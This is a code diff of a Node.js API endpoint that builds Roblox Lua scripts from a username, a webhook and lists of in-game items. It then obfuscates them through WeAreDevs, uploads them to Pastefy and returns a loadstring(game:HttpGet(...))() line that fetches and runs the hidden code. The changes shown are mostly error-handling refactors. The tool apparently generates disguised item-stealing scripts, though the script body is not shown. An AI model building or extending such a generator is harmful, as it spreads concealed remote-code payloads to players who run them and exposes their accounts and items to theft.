@@ -1,18 +1,20 @@
 // api/generate.js
-const fetch = require('node-fetch');
+// Esta versión usa fetch nativo de Node.js 18+, no requiere node-fetch.
 
 export default async function handler(req, res) {
+    // Solo aceptar POST
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    const { username, webhook, mode, brainrots, skins, gears, customCode, shortEnabled } = req.body;
-
-    if (!username) {
-        return res.status(400).json({ error: 'Username is required' });
-    }
-
     try {
+        const { username, webhook, mode, brainrots, skins, gears, customCode, shortEnabled } = req.body;
+
+        // Validar datos mínimos
+        if (!username) {
+            return res.status(400).json({ error: 'Username is required' });
+        }
+
         // 1. Construir el script base
         const script = buildScript(username, webhook, mode, brainrots || [], skins || [], gears || [], customCode || '');
 
@@ -30,10 +32,13 @@ export default async function handler(req, res) {
                     loadstring: `loadstring(game:HttpGet("${pastefyUrl}"))()`,
                     script: obfuscatedScript
                 });
-            } catch (error) {
-                console.error('Error en ofuscación/Pastefy:', error);
-                // Si falla, devolver el script sin ofuscar
-                return res.status(200).json({ script });
+            } catch (ofuscationError) {
+                // Si falla la ofuscación, devolver el script sin ofuscar
+                console.error('Error en ofuscación/Pastefy:', ofuscationError);
+                return res.status(200).json({ 
+                    script,
+                    warning: 'La ofuscación falló, se devuelve el script sin ofuscar.'
+                });
             }
         }
 
@@ -41,7 +46,9 @@ export default async function handler(req, res) {
         return res.status(200).json({ script });
 
     } catch (error) {
-        return res.status(500).json({ error: error.message });
+        console.error('Error en generate:', error);
+        // Siempre devolver JSON válido
+        return res.status(500).json({ error: error.message || 'Internal server error' });
     }
 }
 
@@ -93,7 +100,7 @@ end)`;
 }
 
 // ============================================================
-//  OFUSCAR CON WEAREDEVS
+//  OFUSCAR CON WEAREDEVS (usando fetch nativo)
 // ============================================================
 async function obfuscateWithWeAreDevs(script) {
     const response = await fetch('https://wearedevs.net/api/obfuscate', {
@@ -115,7 +122,7 @@ async function obfuscateWithWeAreDevs(script) {
 
     const obfuscated = data.obfuscated;
     if (!obfuscated) {
-        throw new Error(`No se pudo obtener el script ofuscado.`);
+        throw new Error('No se pudo obtener el script ofuscado.');
     }
     return obfuscated;
 }
